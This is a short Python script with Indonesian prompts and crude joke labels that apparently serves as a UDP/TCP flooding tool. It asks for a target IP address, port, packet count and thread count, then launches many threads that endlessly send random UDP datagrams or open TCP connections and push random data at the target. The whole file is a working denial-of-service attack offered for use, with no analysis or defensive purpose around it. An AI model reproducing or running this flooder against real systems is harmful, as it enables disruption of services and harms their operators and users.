#!/usr/bin/env python3
#Code by LeeOn123
import random
import socket
import threading

print("--> C0de By Kakek Sugiono <--")
print("#-- BOKEP BY DIKA --#")
ip = str(input(" Alamat IP :"))
port = int(input(" Port Rumah:"))
choice = str(input(" Mengirim Bokep(y/n):"))
times = int(input(" Paket bokep yang dikirim:"))
threads = int(input(" Video Bokep:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" MENGIRIM BOKEP BERHASIL")
		except:
			print("[!] GAGAL NGIRIM BOKEP")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" MENGIRIM BOKEP BERHASIL")
		except:
			s.close()
			print("[*] GAGAL NGIRIM BOKEP")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()